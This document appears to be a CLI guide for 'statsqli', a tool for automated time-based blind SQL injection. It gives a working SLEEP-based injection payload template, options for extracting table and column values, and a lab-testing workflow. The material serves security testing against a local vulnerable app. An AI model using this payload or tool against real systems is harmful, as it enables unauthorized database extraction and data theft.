# CLI Guide

The primary command-line entrypoint is `statsqli`.

## Command format

```bash
statsqli <url> [options]
```

Example:

```bash
statsqli "http://127.0.0.1:5000/vulnerable?id=1" \
  --payload "' OR ({condition}) AND SLEEP(2) -- -" \
  --table users \
  --column username \
  --where "id=1 LIMIT 0,1" \
  --max-length 20
```

## Arguments and options

- `url` (positional): target URL with vulnerable parameter.
- `--payload`, `-p`: payload template containing `{condition}` placeholder.
- `--delay`, `-d`: fixed delay in seconds. If omitted, delay is auto-detected.
- `--table`, `-t`: table name (default `users`).
- `--column`, `-c`: column name (default `username`).
- `--where`, `-w`: WHERE clause (default `1=1`).
- `--parallel`: enable parallel extraction.
- `--workers`: number of parallel workers (default `4`).
- `--max-length`: max extracted string length (default `100`).

## Typical workflow

1. Start local vulnerable lab app.
2. Run a short extraction (`--max-length 10`) to verify setup.
3. Enable `--parallel` only after baseline reliability is confirmed.
4. Increase length and iteration complexity as needed.

## Notes

- Delay auto-detection helps under changing network noise.
- Overly aggressive worker counts may increase instability or server load.
- Keep tests limited to authorized lab infrastructure.
